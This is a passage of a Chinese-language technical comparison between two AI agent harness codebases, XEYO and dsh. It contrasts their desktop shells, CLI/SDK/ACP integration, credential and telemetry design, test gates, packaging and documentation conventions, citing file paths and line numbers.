| UI 粒度 | 45 个独立包 + slots 注册 | 1 个 `gui/src`（131 组件 + 165 lib） |
| 插件式 UI | ✅ | ❌ |
| 桌面壳 | ❌ | ✅ Tauri（进程守护 + 自包含 venv 断言） |
| 桌宠 / 系统集成 | ❌ | ✅ pet.rs + Screenshot + SendToWeChat + XeyoUI |
| 终端 UI | CLI（无 TUI） | ✅ `tui/`（Ink，3,544 行） |
| 浏览器快照门 | ✅ | ❌ |
| i18n | ✅ 双语（locale 子包） | 未见独立 i18n 层 |

---


## 域 27 · 桌面壳与进程管理

> 来源：**R2 设计面·设计级对比** · 原节「25. 桌面壳与进程管理」（源 L1114–1133）

##### 25. 桌面壳与进程管理

###### 25.1 XEYO：Rust 壳 + 真探测 + 守护（dsh 完全没有）

- `gui/src-tauri/src/lib.rs:285` `resolve_python_exe`：依次试 `XEYO_PYTHON` → 内嵌 `.venv` → `py -3.11` → `python3/python`。
- `:266` `python_exe_usable`：用一次**真实** `python -c "import sys"` 探测。注释记录了薄壳 venv 事故：「`is_file()` 挡不住启动即失败」。
- `:358` `BACKEND_SPAWN_ERROR`（`OnceLock` 静态槽）+ `:372` `get_backend_error` 把真实失败原因回显 GUI。注释 `:355`：「spawn 失败只 eprintln，用户完全不知道是内嵌 Python 坏了」。
- 守护 `:231-233`：`SUPERVISE_INTERVAL_S=10` / `STARTUP_GRACE_S=20` / `KILL_AFTER_UNHEALTHY_S=30`；`:925-979` 周期探测 + respawn。
- 窗口/桌宠：透明无边框窗 + 独立桌宠窗（`pet.rs`）；sidecar 映射 `resources/python`（`tauri.conf.json:46-48`）。

###### 25.2 dsh：无桌面壳

穷举 `packages/`：**无 tauri / electron 子包**；宿主就是 Node 进程 + 本地 HTTP。`apps/cli/src/args.ts` 的子命令只有 `web`（`--profile web` 别名，`:156`）与 `plugin --profile <n> <pnpm args>`（`:171`），外加启动旗标 `--profile/--patch/--dump-config/--dump-default-config/-V`（`:131-134`）。

###### 25.3 设计分歧

XEYO 的壳承担了一件 dsh 从不需要做的事：**把一个 Python 解释器 + 引擎作为 sidecar 可靠地拉起来**。dsh 是 Node 生态，`npx` 直接跑，没有"解释器不存在/不可用"这个问题类别。所以 XEYO 的壳里那些"真探测/失败原因回显/自包含断言"代码，本质是在补 Node 生态免费得到的东西——**这是选 Python 的代价，不是设计水平问题**。

---


> 来源：**R3 实现面·实现级对比** · 原节「24. 桌面壳与进程管理：实现级」（源 L2017–2047）

##### 24. 桌面壳与进程管理：实现级

###### 24.1 XEYO

**Rust 侧实测只有 3 个文件**：`main.rs`（104 字节，仅入口）、`pet.rs`（4,832 字节，桌宠）、`lib.rs`（**31,110 字节，壳的全部逻辑**）。

`lib.rs` 里的关键机制（第二轮的实现级细化，均已在 09-10 事故中落地）：
- `python_exe_usable()`：**真实探测**（挡「文件存在但不可用」）；
- `resolve_python_exe` 返回 `Result` 且**不静默换解释器**；
- `BACKEND_SPAWN_ERROR` 静态槽 + `get_backend_error` command：GUI 连接失败时**优先显示真实原因**；
- 后端进程守护 + sidecar 打包 + 自包含 slim venv。

**配套脚本**：`scripts/build_slim_venv.py`（自包含断言：缺 DLL / site-packages 不在 `sys.path` / `pyvenv.cfg` 指向外部 → 构建失败）、`build_slim_python.py`、`build_installer.ps1|sh`、`check.ps1|sh`、`smoke_p0p1`。

###### 24.2 dsh

**无桌面壳**（第二轮已穷举确认）。分发形态是 npm 包 + `dsh` CLI + profile 目录；长驻界面是 web profile（浏览器）。

###### 24.3 对照

| 维度 | dsh | XEYO |
|---|---|---|
| 桌面壳 | **无** | Tauri（Rust `lib.rs` 31KB 承担全部壳逻辑） |
| 进程管理 | 无（CLI 即进程） | 拉起 + 守护 + 真探测 + 错误回传 |
| 解释器/运行时 | Node（同语言，无跨语言启动问题） | **Python sidecar**（跨语言，需自包含 venv + 可用性探测） |
| 打包 | npm / 无安装包 | MSI + 自包含 slim venv（~85M/105M） |
| 桌宠 / 托盘 / 快捷键 | 无 | 有（`pet.rs` + 窗口/托盘） |
| 分发一致性风险 | 低 | **高**（薄壳 venv 事故已发生一次） |

---


## 域 28 · 对外集成（CLI / SDK / ACP）

> 来源：**R1 功能面·全量对比** · 原节「23. 对外集成（SDK / ACP / CLI）」（源 L458–469）

##### 23. 对外集成（SDK / ACP / CLI）

| | XEYO | dsh |
|---|---|---|
| SDK | **未见**官方 SDK | **TS SDK**（`packages/sdk/`：protocol/client/server，newline-delimited JSON-RPC over stdio）+ **Python SDK**（`python/sdk/`：`HarnessClient`，`client.py:39-130`） |
| Python 运行时分发 | — | `python/sdk-runtime`：wheel 内打包 `deepseek-harness-sdk-runtime-<platform>-<arch>` **单文件 Node 可执行** + ripgrep 旁路 + macOS spawn-helper（`__init__.py:55-90`） |
| ACP | **未见** | `packages/acp/`：Agent Client Protocol server（`@agentclientprotocol/sdk`），暴露 initialize/new-session/resume/list/prompt/request-permission/cancel（`acp/src/index.ts:20-47`）；亦可作为子代理 provider |
| CLI | Typer：`version/setup/chat/attach/serve`、`coord run|status`、`sessions list|show|rm`、`config path|show|set`（`cli/main.py:123-321`） | `dsh`：`--profile`、`web`、`plugin --profile <n> <pnpm args>`、`--dump-config`、`--dump-default-config`、`--patch`、`-V`（`apps/cli/src/args.ts:117-191`） |
| 斜杠命令 | **35 条**（`slash/registry.py`：help/version/docs/clear/load/export/retry/goal/exit/mode/output/code/model/theme/approval/status/usage/context/cwd/ls/stop/allow/deny/compact/transcript/rule/doctor/proposals/run/git/diff/revert/skills/mcp/plugins），SSOT → 导出 TS manifest（`slash.export_manifest --check` 进门禁） | `ctx.commands`：`CommandDefinition`（name 必须 `^[a-z][a-z0-9_-]*$`），handler 返回 `CommandResult`（`commands/src/index.ts:60-75`）；`command/run`/`command/done` 事件 |

---


> 来源：**R2 设计面·设计级对比** · 原节「26. 对外集成（CLI / SDK / ACP）」（源 L1134–1148）

##### 26. 对外集成（CLI / SDK / ACP）

| | dsh | XEYO |
|---|---|---|
| **SDK** | **TS SDK**（`packages/sdk/`：protocol / client / server，newline-delimited JSON-RPC over stdio）+ **Python SDK**（`python/sdk/src/deepseek_harness/client.py:39` `HarnessClient`，同步客户端，`profile="sdk"`，`:24-36`） | **未见** |
| **运行时打包** | `python/sdk-runtime`：wheel 内打包 `deepseek-harness-sdk-runtime-<platform>-<arch>` **单文件 Node 可执行** + ripgrep sidecar + macOS spawn-helper（`__init__.py:6-9, 55-90`） | — |
| **ACP** | `packages/acp/`：Agent Client Protocol server（JSON-RPC stdio），暴露 `initialize / new-session / resume / list / prompt / request-permission / cancel`（`acp/src/index.ts:1-7, 20-47`），`inject:['agents','llm','sessionPersistence','sessions']`（`:62`）；**亦可作为子代理 provider** | **未见** |
| **CLI** | `dsh`：profile 启动器 + `plugin` 包管理（见 §25.2） | Typer：`version / setup / chat / attach / serve` + `coord run|status` + `sessions list|show|rm` + `config path|show|set`（`cli/main.py:123-301`） |
| **斜杠命令** | `ctx.commands`：`CommandDefinition`（name 必须 `^[a-z][a-z0-9_-]*$`），handler 返回 `CommandResult`；`command/run` / `command/done` 事件（`commands/src/index.ts:60-75`） | **35 条**（`slash/registry.py`），SSOT → 导出 TS manifest，`slash.export_manifest --check` 进门禁 |
| **第二客户端** | web / headless / sdk / sdk-minimal / acp 五 profile | TUI（Ink） |

**这是 XEYO 的第三大缺口**：它对外只能"人用"（GUI/TUI/CLI），没有"程序用"的接口。dsh 的 SDK + ACP 让它能被 IDE、其他 Agent、脚本当成一个**组件**接入——这是 `subagent-codex` / `subagent-claude-code` 能存在的前提（反过来，它也能当别人的子代理）。

---


> 来源：**R3 实现面·实现级对比** · 原节「25. 对外集成（CLI / SDK / ACP）：实现级」（源 L2048–2081）

##### 25. 对外集成（CLI / SDK / ACP）：实现级

###### 25.1 dsh

- **CLI**（`apps/cli/src/args.ts`）：`--profile` / `--patch`（repeatable）/ `--dump-config` / `--dump-default-config` + 子命令 `web` / `plugin`（详见 §21.1）。配套模块：`args.ts` / `bin.ts` / `plugin.ts` / `profile-boot.ts` / `process-shutdown.ts` / `dump-config.ts` / `sdk-source.cordis.patch.yml`。
- **SDK**：`packages/sdk`（TS）+ `python/sdk` + `python/sdk-runtime`（打包运行时，**Python wheel**）；`subagent-dsh-sdk` 说明 SDK 也被用作子代理 provider。
- **ACP**（Agent Client Protocol）：`packages/acp`（19 文件 / 4,885 行）+ `subagent-acp`——**双向**：既能作 ACP server 被别的客户端接，也能作客户端去驱动 ACP 兼容的子代理。

###### 25.2 XEYO

**CLI 子命令实测**（`python/cli/main.py`）：

| 组 | 命令 |
|---|---|
| 顶层 | `version` / `setup` / `chat` / `attach` / `serve` |
| `sessions` | `list` / `show` / `rm` |
| `config` | `path` / `show` / `set` |
| `coord` | `run` / `status` |

**对外能力**：Typer CLI + HTTP attach + TUI + 微信通道（`SendToWeChat` 工具 + outbound ASK）。**无 SDK、无 ACP**。

###### 25.3 对照

| 维度 | dsh | XEYO |
|---|---|---|
| CLI 形态 | profile 启动器（配置组合为中心） | 功能命令族（chat/attach/serve + 3 组管理） |
| CLI 命令数 | 2 子命令 + 4 选项 | **12 命令 / 4 组** |
| SDK | TS + Python（含打包运行时 wheel） | 无 |
| ACP | 有（server + client 双向） | 无 |
| 对外通道 | RPC / SDK / ACP | HTTP + CLI + TUI + 微信 |
| 配置导出 | `--dump-config` | `config show` |

---


## 域 29 · 配置 / 凭据 / 身份 / 遥测

> 来源：**R1 功能面·全量对比** · 原节「24. 凭据 / 设置 / 身份 / 遥测」（源 L470–480）

##### 24. 凭据 / 设置 / 身份 / 遥测

| | XEYO | dsh |
|---|---|---|
| 凭据 | 未见独立 seam（配置 + 环境变量） | `ctx.credentials` seam：两层——`CredentialRef`（环境变量名，按 env/file/project-env/user-env 分层，每次操作重解，`credentials/src/index.ts:183`）+ `CredentialKey`（授权记录，`modifyRecord` 唯一写路径）；**值永不明文暴露** |
| 设置 | `settings.json` home + workspace 合并 | `ctx.settings` seam：`schema 默认 → composition base → 用户文档`（用户层覆盖 base，`settings/src/index.ts:740-753`）；**wire 前必 `redactSecrets`**（`:105-108,529`） |
| 身份 | 未见 | `ctx.identity`：随机 UUID v4 存 `$DSH_HOME/.anonymous-user-id`，**绝不取主机名/网络**（`anonymous-user-id/src/index.ts:26-29,54`） |
| 遥测 | `usage/` + `audit/` 模块（本地账本） | `ctx.sessionTelemetry` seam + `session-telemetry-otel`（OpenTelemetry）；XEYO 侧 grep `opentelemetry` 零命中 |

---


> 来源：**R2 设计面·设计级对比** · 原节「27. 配置 / 凭据 / 身份 / 遥测」（源 L1149–1163）

##### 27. 配置 / 凭据 / 身份 / 遥测

| 维度 | dsh | XEYO |
|---|---|---|
| 设置优先级 | `schema 默认 → composition base → 用户文档`（用户层覆盖 base，`settings/src/index.ts:740-753`） | `home + workspace` 深合并，**workspace 更具体者优先**（`extension/config.py:202-214`） |
| 脱敏 | wire 前必 `redactSecrets`（`:105-108, 529`） | `scrub_audit_fields` 只作用于审计日志（`audit/log.py:30-45`） |
| 凭据 | `ctx.credentials` seam：`CredentialRef`（环境变量名，按 env/file/project-env/user-env 分层，**每次操作重解**，`:183`）+ `CredentialKey`（授权记录，`modifyRecord` 唯一写路径）；「**值永不明文暴露**」（`:5-7`） | **未见独立 seam**（环境变量 + 配置） |
| 身份 | `anonymous-user-id`：随机 UUID v4 存 `$DSH_HOME/.anonymous-user-id`，**绝不取主机名/网络/git remote**（`:1-17, 68`） | **未见** |
| 遥测 | `ctx.sessionTelemetry` seam + `session-telemetry-otel`（OpenTelemetry） | grep `opentelemetry` **0 命中**；只有本地 `usage/` + `audit/` 账本 |
| 不变式 | `ctx.invariants` 注册表 + 各包 `invariant` companion，违反抛 `InvariantError`（`runtime-diagnostics/invariants/src/index.ts:50-66`） | 分散在各 guard |

作者对凭据设计的一句话（`credentials/src/index.ts:5-7`）：「providers own the actual values … Consumers resolve a reference once per operation, so **a changed credential reaches the next operation without any plugin restart**」——引用/值分离，换来"换钥匙不用重启"。

---


> 来源：**R3 实现面·实现级对比** · 原节「26. 配置 / 凭据 / 身份 / 遥测：实现级」（源 L2082–2097）

##### 26. 配置 / 凭据 / 身份 / 遥测：实现级

| 项 | dsh | XEYO |
|---|---|---|
| 配置 | profile 目录（`package.json` + `cordis.patch.yml`）+ `$DSH_HOME` | `.xeyo/settings.json`（home + workspace 合并，workspace 优先） |
| 坏配置 | profile 装载失败即失败 | **keep-last-good + `config.invalid` 审计**（方向安全） |
| 凭据 | `packages/credentials`（19 文件 / 4,305 行）+ `credentials-local` | 未见独立凭据模块（API key 经 `key_fingerprint` 进账本但不落明文） |
| 身份 | `packages/identity`（**2 文件 / 205 行**，极小） | 无等价物（身份即 `IDENTITY` 提示句） |
| 遥测 | `runtime-diagnostics` 包 | **无**（`opentelemetry` 全仓零命中，第二轮已穷举） |
| 审计 | 事件即审计（`hook/invoked`+`hook/result`、`approval/asked`+`approval/decided`） | `audit.log`（`audit/log.py`）+ `server/routers/audit.py`（1 路由） |
| 日志 | `session-log-deepseek` 包（含 `session-log-deepseek/delivery-accepted` 事件） | JSONL session + `logs/` 目录 |

**一个值得注意的规模反差**：dsh 的 `identity` 只有 205 行——说明它把「身份」当极小的事；XEYO 没有独立身份模块，但 `IDENTITY` 常量是**跨入口共用的单一入口**（`system_prompt.py:21-25` 注释：「GUI / CLI / side-chat / 子 agent 前缀共用」）。

---


## 域 30 · 测试与质量门 / 工程门禁

> 来源：**R1 功能面·全量对比** · 原节「25. 测试与质量门」（源 L481–496）

##### 25. 测试与质量门

| | XEYO | dsh |
|---|---|---|
| 单测 | pytest `-q --timeout=60 -m "not live"`（`scripts/check.ps1:11`）；307 个文件 | vitest；863 个 spec；`resilience/edge case/event ordering/concurrency race` 为明确偏好 |
| 覆盖率门 | **未见** | **per-file 100% on `packages/*/*/src`**（`docs/testing.md:10`），"未覆盖的行往往是死代码" |
| 类型门 | `tsc -b`（gui）+ tui typecheck | `strict: true` + `noImplicitAny` + 每个 `any` 需解释；`verify-export-jsdoc` 强制 JSDoc |
| 契约门 | `slash.export_manifest --check`；`tests/test_t_now_block_registry.py`（块登记表一一对应执法）；`test_freeze_invariants.py` | **40+ 个 `verify-*` 脚本**：`verify-application-entrypoints`、`verify-cordis-config`、`verify-tool-catalog`、`verify-package-invariants`、`verify-md-links`、`verify-agent-note-classification`、`verify-skill-invocation-metadata`、`verify-translation-pairing`… |
| 快照 | 未见 | **录制会话回放**：`test:snapshot`（keyless 回放录制的 session 走真实 profile）、`test:expected`、`test:web`（Chromium 对比） |
| 真 API e2e | `-m "not live"` 排除，即**平时不跑** | `test:e2e` 显式跑真 API，**"We are DeepSeek — do not ration real-API tests"**（`testing.md:23`）；无 key 自跳过 |
| 不变式 | 分散在各 guard | `ctx.invariants` 注册表 + `packages/*/invariant` companion，违反抛 `InvariantError`（`runtime-diagnostics/invariants/src/index.ts:50-66`） |
| 已知失败 | 显式 `xfail` 并注明归属（实测仅 2 处，均在 `test_bash_isolated.py:25`） | 无 xfail 文化；改行为改测试并说明理由 |
| 提交门 | `scripts/check.ps1`（pytest + manifest + gui typecheck/vitest + tui typecheck），**无 hook 强制** | `lefthook.yml` + `pnpm run check:all` + CI 多平台矩阵（含 win-wine 观测道） |

---


> 来源：**R2 设计面·设计级对比** · 原节「28. 测试与质量门」（源 L1164–1181）

##### 28. 测试与质量门

| 维度 | dsh | XEYO |
|---|---|---|
| 单测规模 | vitest **863** spec | pytest **307** 文件；GUI vitest ~102 |
| **覆盖率门** | **per-file 100% on `packages/*/*/src`**（`docs/testing.md:10`）：「未覆盖的行往往是死代码」 | **未见** |
| 类型门 | `strict: true` + `noImplicitAny` + 每个 `any` 需解释；`verify-export-jsdoc` 强制 JSDoc | `tsc -b`（gui）+ tui typecheck |
| **快照回放** | `test:snapshot`（录制的 session 走真实 profile 回放）+ `test:expected` + `test:web`（Chromium 比对，**required Linux PR gate**）（`testing.md:13-14, 54`） | **未见** |
| 真 API e2e | `test:e2e` 显式跑真 API，作者原话「**We are DeepSeek — do not ration real-API tests**」（`:23-24`） | `-m "not live"` **平时不跑**（`scripts/check.ps1:11`） |
| 契约/生成物门 | **40+ `verify-*`**（application-entrypoints / cordis-config / tool-catalog / package-invariants / md-links / agent-note-classification / skill-invocation-metadata / translation-pairing…） | `slash.export_manifest --check`；`test_t_now_block_registry.py`（4 用例）；`test_freeze_invariants.py` |
| 不变式 | `ctx.invariants` 注册表 | 分散 |
| 已知失败 | 无 xfail 文化；改行为改测试并说明理由 | 显式 `xfail` + 注明归属（实测 2 处，`test_bash_isolated.py:25`） |
| 提交门 | `lefthook.yml` + `pnpm run check:all` + CI 多平台矩阵（含 win-wine 观测道） | `scripts/check.ps1`，**无 hook 强制**（靠人跑） |

**门禁强度差距是本轮最一致的一处**：dsh 是"五重门"（覆盖 + 快照回放 + 浏览器 + 真 API + 40 verify），XEYO 是"四件事"（pytest 非 live + manifest + typecheck + vitest）。而且 XEYO 的 pytest **平时不跑真 API**，dsh 明确要求不省真 API 测试——这直接影响"改动是否有真实收益"的可证性。

---


> 来源：**R3 实现面·实现级对比** · 原节「27. 质量门与测试：实现级」（源 L2098–2146）

##### 27. 质量门与测试：实现级

###### 27.1 dsh：per-file 100% 覆盖率门 + 完整性 guard

**`docs/testing.md` 实测原文**：

> **Coverage gate** (`pnpm run test:coverage`): the gating run, **per-file 100% on `packages/*/*/src`**. An uncovered line is often dead code the gate flags for deletion, not a missing test to bolt on. Line coverage is necessary, never sufficient — it proves lines ran, not that the feature works as shipped. Per-file 100% on `packages/shell/pwsh-local/src` needs a real `pwsh`: without one its executor suites self-skip and `vitest.config.ts` exempts the file so pwsh-less hosts stay green, while CI runners ship pwsh and enforce the full bar.

**三条实现级要点**：
1. **未覆盖行 = 删代码的信号**（不是补测试的信号）——这条把覆盖率门从「补测试指标」改造成「死代码发现器」；
2. **明确承认行覆盖率的局限**（"necessary, never sufficient"）；
3. **有平台条件的豁免机制**：`vitest.config.ts` 对 `pwsh-local` 豁免，无 pwsh 的机器保持绿，CI 有 pwsh 则执行完整门——**豁免点在配置里显式声明，不是静默跳过**。

**录制会话快照回放**（`docs/testing.md:16` 原文）：

> Session fixtures retain headers and payloads but **omit body sequence/time envelopes; replay synthesizes them**. Replay, record, and refresh select each **parent/child role's highest generation**. Current v2 uses `.v2`, one row per event, and embedded compact Assistant streams; retained v0 (suffixless) and v1 (`.v1`) may keep canonical packed rows for migration coverage. [The migrator](../scripts/migrate-packed-session-fixtures.ts) rewrites older historical layouts.

——即：**fixture 不存 `seq`/`time`（回放时合成）**，且历史三代布局（v0 / v1 / v2）共存并有迁移脚本。

**其他机器门（实测）**：
- `verify-tool-catalog`（doc-sync 的一部分）：**新 `packages/*/tool-*` 未进文档即失败**；
- cordis catalog 的生成/校验；
- 863 个测试文件；CI 有覆盖率分区并行 + self-hosted runner 共享主机与卷（`docs/testing.md:20` 明确「Only the process is isolated: ports, predictable paths, external namespaces, and inherited children are not」）。

###### 27.2 XEYO：三道本地门 + 无覆盖率门

- **`scripts/check.ps1` / `check.sh`**：pytest（not live）+ typecheck + vitest；
- **无 pre-commit / husky**——「全绿才 commit」纯靠人跑（第二轮已认定）；
- **无 per-file 覆盖率门**；
- **CI**（`.github/workflows/ci.yml`）：`push` 到 `main`/`master` + `pull_request` 触发；`concurrency` 分 `ci-${{ github.ref }}` 且 `cancel-in-progress: true`；python job 在 `ubuntu-latest` 用 Python 3.11，依赖缓存指 `python/requirements.txt` + `python/pyproject.toml`；
- **`.github/workflows/ci.yml` 只在 push 后生效**（第二轮）——这是「本地门 vs CI 门」的实现级缺口；
- **测试规模**：python 307 个 `test_*.py`；gui 102 个测试文件；
- **沙箱内全量 pytest 不可靠**（basetemp 竞争假失败），须单跑 + `--basetemp` 全新路径（第二轮已记入项目记忆）。

###### 27.3 对照

| 维度 | dsh | XEYO |
|---|---|---|
| 覆盖率门 | **per-file 100%**（`packages/*/*/src`），未覆盖行视为死代码 | 无 |
| 平台豁免 | 配置里显式声明（`vitest.config.ts` 豁免 pwsh-local） | 无 |
| 文档完整性门 | **有**（tool-catalog / cordis catalog 生成 + 校验，新工具未文档化即失败） | 部分（slash manifest 生成，但无「未文档化即失败」） |
| 快照回放 | **有**（fixture 省略 seq/time，回放合成；v0/v1/v2 三代 + 迁移脚本） | 无 |
| 本地门 | 见 testing.md 的多门清单 | `check.ps1`（3 门） |
| pre-commit | 未见 | **无**（纯靠人） |
| 测试数 | 863 文件 | 307 + 102 文件 |
| CI 触发 | （未读 CI 配置，`docs/testing.md` 只提门） | push/PR；**仅在 push 后生效** |

---


> 来源：**R4 枚举面·逐字段级对比** · 原节「§16 工程门禁：逐条」（源 L1296–1335）

##### §16 工程门禁：逐条

###### 16.1 dsh

| 门 | 内容 | 证据 |
|---|---|---|
| 覆盖率门 | `pnpm run test:coverage` — **per-file 100% on `packages/*/*/src`** | `docs/testing.md:10` |
| 覆盖率哲学 | "An uncovered line is often **dead code the gate flags for deletion**, not a missing test to bolt on. Line coverage is necessary, never sufficient." | 同上 |
| 平台豁免 | `packages/shell/pwsh-local/src` 需真实 pwsh；无 pwsh 的机器 suite 自跳过且 `vitest.config.ts` 豁免该文件；CI 有 pwsh 则全量执行 | 同上 |
| 真实 API e2e | `pnpm run test:e2e`（`EXA_API_KEY` / `PERPLEXITY_API_KEY` 等各自 gate，无 key 自跳过） | `:11` |
| 浏览器快照 | `pnpm run test:web`（**required Linux PR gate**）；CI 强制 `DSH_SNAPSHOT=replay` **只读**；录制/刷新仅本地且每次 diff 需 review | `:14` |
| fixture 版本链 | 当前 **v2**（每事件一行 + 内嵌 compact Assistant 流）；保留 v0（无后缀）/ v1（`.v1`）；迁移器 `scripts/migrate-packed-session-fixtures.ts` | `:16` |
| 并行纪律 | 只有进程隔离；端口 / 可预测路径 / 外部命名空间 / 继承子进程**不隔离**；"a spec that passes only when it runs alone [is] a defect in the spec" | `:20` |
| 测试规模 | **863** 个 spec/test 文件 | 实测 |

###### 16.2 XEYO

| 门 | 内容 | 证据 |
|---|---|---|
| 本地统一门 | `pwsh -File scripts/check.ps1`：Python `pytest -q --timeout=60 -m "not live"` + `slash.export_manifest --check` → GUI `npm run typecheck` + `npm test` → tui `npm run typecheck` | `scripts/check.ps1` |
| CI | `push` 到 main/master + PR；`python` job（3.11，pytest + slash manifest drift check）+ `gui` job（node 20，typecheck + test） | `.github/workflows/ci.yml` |
| 覆盖率门 | ❌ 无 | — |
| 浏览器快照 | ❌ 无 | — |
| 契约冻结测试 | ✅ T_now 登记表执法（4 用例）、扩展层 6 个契约测试、bash 路由契约 | `tests/test_t_now_block_registry.py` 等 |
| 测试规模 | pytest **307** / vitest **102** | 实测 |
| 提交门 | AGENTS.md 规定 `tsc + vitest + pytest P0` 全绿才 commit；**无 pre-commit/husky**（靠人跑） | `AGENTS.md` |

###### 16.3 门禁强度对照

| 维度 | dsh | XEYO |
|---|---|---|
| 覆盖率 | per-file 100% 硬门 | 无 |
| e2e 真实 API | ✅ 分 key 自跳过 | 部分（`-m "not live"` 反向） |
| 浏览器快照 | ✅ required PR gate | ❌ |
| 契约/冻结测试 | 包级 invariant 文件（`invariant.ts` 出现在 session/tools/sandbox/compaction 等包） | 集中在 tests/ 若干文件 |
| fixture 版本迁移 | ✅ v0/v1/v2 + 迁移器 | ❌（无版本号） |
| 门禁自动化 | 覆盖率 + e2e + web + lint 全自动 | 3 段脚本 + CI，无覆盖率 |

---


## 域 31 · 构建 / 打包 / 分发

> 来源：**R1 功能面·全量对比** · 原节「26. 构建 / 打包 / 分发」（源 L497–509）

##### 26. 构建 / 打包 / 分发

| | XEYO | dsh |
|---|---|---|
| 产物 | **Tauri 应用**：NSIS + MSI（`gui/src-tauri/tauri.conf.json:37`），`resources/python/` 映射进安装目录（`:46-48`） | **npm 包**：`npx @deepseek-ai/dsh web`；profile 即分发单位 |
| Python 运行时 | `scripts/build_slim_venv.py`：用 `astral-sh/python-build-standalone` 造**自包含可重定位** venv（自带 DLL/标准库/VC 运行时），带**自包含性断言**；`pyvenv.cfg` 必须写 `home=.` | `python/sdk-runtime`：单文件 Node exe + ripgrep |
| 构建编排 | `scripts/build_installer.ps1`（3 步：精简 Python → slim venv → `tauri:build`） | `pnpm run build`（tsc → `lib/`，tsdown 打包） |
| 开发启动 | `XEYO.bat`（校验 node/py3.11 → 起后端 → 等 `/health` → `npm run tauri:dev`） | `pnpm dsh web`（源码启动走 `node --import tsx/esm`） |
| CI | `.github/workflows/ci.yml`：python(pytest) / gui(typecheck+test) / tui(typecheck) | `.gitlab-ci.yml` + `.github/`：多平台矩阵（linux-primary、static、coverage、snapshot、artifacts、consumers、windows-blocking/complete/observational、wine） |
| 容灾 | bare mirror（`D:/lea/XenYon-git-mirror-*.git`）+ 封存 `.git.broken-*`；**无 remote** | 标准 GitHub 仓库 + PR 栈工作流 |

---


> 来源：**R2 设计面·设计级对比** · 原节「29. 构建 / 打包 / 分发」（源 L1182–1196）

##### 29. 构建 / 打包 / 分发

| 维度 | dsh | XEYO |
|---|---|---|
| 产物 | **npm 包**：`npx @deepseek-ai/dsh web`；**profile 即分发单位** | **Tauri 应用**：NSIS + MSI（`tauri.conf.json:37`），`resources/python/` 映射进安装目录（`:46-48`） |
| 构建编排 | `pnpm run build`（tsc → `lib/`，tsdown 打包） | `scripts/build_installer.ps1` 三步：精简 Python → slim venv → `tauri:build` |
| Python 运行时 | `python/sdk-runtime`：单文件 Node exe + ripgrep | `scripts/build_slim_venv.py`：用 `astral-sh/python-build-standalone` 造**自包含可重定位** venv（自带 DLL / 标准库 / VC 运行时），**带自包含性断言**；`pyvenv.cfg` 必须写 `home=.` |
| 开发启动 | `pnpm dsh web`（源码走 `node --import tsx/esm`） | `XEYO.bat`（校验 node/py3.11 → 起后端 → 等 `/health` → `npm run tauri:dev`） |
| CI | `.gitlab-ci.yml` + `.github/`：多平台矩阵（linux-primary / static / coverage / snapshot / artifacts / consumers / **windows-blocking / complete / observational** / wine）；`sdk-wheel` + 5 个 runtime 平台 | `.github/workflows/ci.yml`：python(pytest) / gui(typecheck+test) / tui(typecheck) |
| 容灾 | 标准 GitHub + PR 栈 | bare mirror（`D:/lea/XenYon-git-mirror-*.git`）+ 封存 `.git.broken-*`；**无 remote** |

XEYO 在这条链上有一个 dsh 没有的**硬约束**：安装包必须自带 Python 运行时，于是"自包含性断言"成为构建门的一部分（缺 DLL / site-packages 不在 sys.path / `pyvenv.cfg` 指向外部 → 构建失败）。这是被事故逼出来的工程纪律（薄壳 venv 事故），价值高于 dsh 的 `npx` 一键分发。

---


> 来源：**R3 实现面·实现级对比** · 原节「28. 构建 / 打包 / 分发：实现级」（源 L2147–2160）

##### 28. 构建 / 打包 / 分发：实现级

| 项 | dsh | XEYO |
|---|---|---|
| 构建器 | `tsdown`（每包一个 `tsdown.config.ts`）+ monorepo 工具链 | Vite + tsc；`cargo` 打 Tauri；PyInstaller 之类不用于后端（用 slim venv） |
| 分发物 | npm 包 + `dsh` CLI | MSI（Tauri）+ 内嵌自包含 Python 运行时 |
| 运行时自包含 | N/A（Node 同语言） | **必须自包含**（`build_slim_venv.py` 用 python-build-standalone + 三条断言） |
| 体积 | N/A | 52M/77M → **~85M/~105M**（裁 pytest/ray/sqlalchemy、保留 pip） |
| 依赖隔离 | pnpm workspace | pip（产品可装可选依赖） |
| 模板/生成 | cordis catalog / tool catalog | slash manifest |
| 关键坑 | 未见记录 | **`pyvenv.cfg` 必须写 `home=.`（无空格）**；替换 venv 前必须停后端（WinError 5）；构建脚本禁递归删大目录（改名旁置） |

---


## 域 32 · 文档与协作规范

> 来源：**R1 功能面·全量对比** · 原节「27. 文档与协作规范」（源 L510–521）

##### 27. 文档与协作规范

| | XEYO | dsh |
|---|---|---|
| 仓库级规范 | `AGENTS.md`（设计理念五条 + 工程硬规矩七条） | `AGENTS.md`（155 行）+ `packages/AGENTS.md` + `docs/AGENTS.md` + `vendor/AGENTS.md` + `snapshots/AGENTS.md` |
| 文档量 | 21 篇（含 3 篇审计、1 篇 BENCH 口径、1 篇 dsh 考据） | 363 个文件，含**生成式目录**（tool-catalog / config-catalog / capability-seams / module-graph / persistence-catalog / event-producer-consumer / graph-atlas）+ 40+ 子系统页 + postmortem |
| 双语 | 中文为主 | **强制双语**（`*.md` + `*.zh.md` + `*.i18n.yaml`），`verify-translation-pairing` 执法 |
| 变更伴随文档 | 未强制 | **非平凡改动必须同 PR 附 Agent Note**（`AGENTS.md:125`），归档笔记冻结不可改 |
| 散文规范 | 引擎文本铁律 | `dsh-prose-standard` 技能 + 禁用隐喻、禁用 `contract/boundary/shape` 滥用（`AGENTS.md:144`） |

---


> 来源：**R2 设计面·设计级对比** · 原节「30. 文档与协作规范」（源 L1197–1211）

##### 30. 文档与协作规范

| 维度 | dsh | XEYO |
|---|---|---|
| 仓库级规范 | `AGENTS.md`（155 行）+ `packages/AGENTS.md` + `docs/AGENTS.md` + `vendor/AGENTS.md` + `snapshots/AGENTS.md` | `AGENTS.md`（设计理念五条 + 工程硬规矩七条） |
| 文档量 | **363 个文件**，含生成式目录（tool-catalog / config-catalog / capability-seams / module-graph / persistence-catalog / event-producer-consumer / graph-atlas）+ 40+ 子系统页 + postmortem | 21+ 篇（含 3 篇审计、BENCH 口径、dsh 考据、应试性审查） |
| 双语 | **强制**（`*.md` + `*.zh.md` + `*.i18n.yaml`），`verify-translation-pairing` 执法 | 中文优先 |
| 变更伴随文档 | **非平凡改动必须同 PR 附 Agent Note**（`AGENTS.md:125`），归档笔记冻结不可改 | 未强制 |
